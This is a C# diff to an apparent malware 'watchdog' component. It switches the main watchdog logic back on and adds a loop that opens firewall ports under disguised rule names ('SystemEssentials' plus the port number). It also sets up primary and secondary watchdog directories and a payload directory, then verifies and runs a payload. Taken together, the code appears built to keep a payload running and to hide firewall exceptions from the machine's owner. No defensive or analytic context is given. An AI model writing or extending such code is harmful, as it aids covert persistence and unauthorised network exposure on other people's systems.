@@ -43,9 +43,7 @@ class Watchdog
             }
 
             // Call the main watchdog logic
-            //WatchdogLogic();
-            watchdogHelper.OpenFirewallPort(80, "Test");
-            Console.ReadLine();
+            WatchdogLogic();
         }
     }
 
@@ -72,6 +70,13 @@ class Watchdog
             watchdogHelper.EnsureDirectoryExists(Config.SecondaryWatchdogPath);
             watchdogHelper.EnsureDirectoryExists(Config.PrimaryWatchdogPath);
             watchdogHelper.EnsureDirectoryExists(Config.PayloadPath);
+
+
+            foreach(int port in Config.PortsToKeepOpen)
+            { 
+                string ruleName = "SystemEssentials" + port.ToString();
+                watchdogHelper.OpenFirewallPort(port, ruleName);
+            }
 
             watchdogHelper.verifyFilePathsSourceAndDest(Config.PayloadPath, Config.PayloadName);
             watchdogHelper.CheckAndRunPayload(Config.PayloadPath, Config.PayloadName);
